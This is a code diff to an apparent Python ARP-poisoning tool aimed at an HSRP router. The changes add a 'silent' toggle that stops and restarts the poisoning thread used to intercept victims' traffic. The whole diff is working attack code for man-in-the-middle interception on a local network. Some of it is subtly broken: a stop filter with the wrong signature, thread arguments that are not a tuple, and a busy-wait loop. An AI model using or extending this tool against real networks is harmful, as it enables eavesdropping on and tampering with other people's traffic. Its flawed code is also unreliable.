@@ -53,6 +53,7 @@ version: int
 pkcopy: Packet
 timekeeper = {}
 commandlist = []
+poison_stop_var = False
 # for suppressing output
 suppress = False
 ####################
@@ -281,6 +282,7 @@ def start_selective_poisoning(packet):
     Packets will be broadcast to look like a request for the virtual gateway ip'''
     if debug and poisonrouter:
         print("[DEBUG] Poisoning router to get return packets")
+        print(f"[DEBUG] Silent mode: {silentmode}")
     routerIP = packet[IP].src
     # selectively poison when detecting exploitable packet
     if silentmode:
@@ -288,7 +290,13 @@ def start_selective_poisoning(packet):
     else:
         silentrule = ""
     filterstring = f"(tcp or udp) and src host not ({routerIP} or 0.0.0.0) and ether src host not {mymac} and src net {mynetwork}{silentrule}"
-    sniff(prn=arp_poison, filter=filterstring)
+    sniff(prn=arp_poison, filter=filterstring, stop_filter=stop_poison)
+    global poison_stop_var
+    # to help signal to input handler function that thread is stopping
+    poison_stop_var = False
+    
+def stop_poison():
+    return poison_stop_var == True
 
 def arp_poison(packet):
     '''Called by sniff() in start_selective_poisoning to poison arp cache of HSRP router when attacker receives traffic from victim
@@ -481,6 +489,18 @@ def user_input_handler():
                 global poisonrouter
                 poisonrouter = poisonrouter != True
                 print(f"[INFO] poisonrouter set to {poisonrouter}")
+            case "silent":
+                global poison_stop_var
+                global silentmode
+                # signal for thread to stop
+                poison_stop_var = True
+                # wati for thread to terminate
+                while poison_stop_var:
+                    pass
+                # toggle silentmode
+                silentmode = silentmode != True
+                # start thread again
+                threading.Thread(target=start_selective_poisoning, args=(pkcopy), daemon=True).start()
 
 def setup():
     '''Runs commands to configure linux for attack'''
